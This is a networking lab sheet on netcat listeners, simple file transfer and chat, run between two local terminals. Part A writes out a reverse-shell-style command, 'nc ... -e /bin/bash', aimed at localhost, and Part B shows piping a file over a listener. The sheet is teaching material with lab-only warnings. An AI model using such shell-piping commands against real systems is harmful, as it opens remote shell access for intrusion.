# 🧪 Lab Sheet — Networking Day 09: netcat Part 2 (Listener & Simple File Transfer)

Run these yourself. Take a screenshot at each marked point. Once done, send me the output/screenshots and I'll build the final `README.md` from your real results.

**Everything today is LAB-ONLY — your own machine, or between two of your own VMs on an isolated network. Never expose a listener to the public internet.**

---

## Part A: a basic reverse-shell-style listener (educational, local only)

This demonstrates WHY netcat listeners matter in security — the same mechanism used in legitimate remote administration is also what a malicious reverse shell relies on. Running this only between two terminals on your own machine keeps it a safe, educational demo.

```bash
# Terminal 1 - listener waiting for a connection
nc -lvnp 4444

# Terminal 2 - connect and pipe a shell into it (ONLY ever do this to yourself)
nc 127.0.0.1 4444 -e /bin/bash
# (if your nc doesn't support -e, skip this exact command and just note that down -
#  many modern netcat builds disable -e specifically because of its abuse potential)
```
📸 Screenshot: `01-shell-listener.png`

**Note down:**
- Did `-e` work, or did you get an error saying it's not supported?
- Why do you think many Linux distros ship a version of netcat with `-e` deliberately removed?

---

## Part B: simple file transfer

```bash
# Terminal 1 - receiver, listening and saving whatever it gets to a file
nc -lvnp 4444 > received_file.txt

# Terminal 2 - sender, pipe a file's contents into the connection
echo "This is a test file transfer via netcat" > test_file.txt
nc 127.0.0.1 4444 < test_file.txt

# Back in Terminal 1, once the transfer finishes (Ctrl+C there if it doesn't auto-close):
cat received_file.txt
```
📸 Screenshot: `02-file-transfer.png`

**Note down:**
- Did the received file match the original exactly?
- What's missing from this method compared to a "real" file transfer tool (hint: think about what scp/rsync do that this doesn't)?

---

## Part C: netcat as a simple chat / pipe test

```bash
# Terminal 1
nc -lvnp 5555

# Terminal 2
nc 127.0.0.1 5555

# Type messages back and forth, Ctrl+C both when done
```
📸 Screenshot: `03-netcat-chat.png`

**Note down:**
- This is the same basic mechanism as Day 08's Part C — why do you think this simple back-and-forth is the foundation that both file transfer (Part B) and shells (Part A) build on?

---

## When you're done

Send me:
1. The screenshots (or paste the raw terminal text)
2. Your answers to the "note down" questions above
3. Anything that errored or looked weird

I'll turn this into the final `README.md`, fill in `commands.txt`, and help you write `notes.txt`.

**Reminder:** Day 08's `LAB.md` is still pending — send that netcat output first if you haven't yet, so both days can be documented in order.
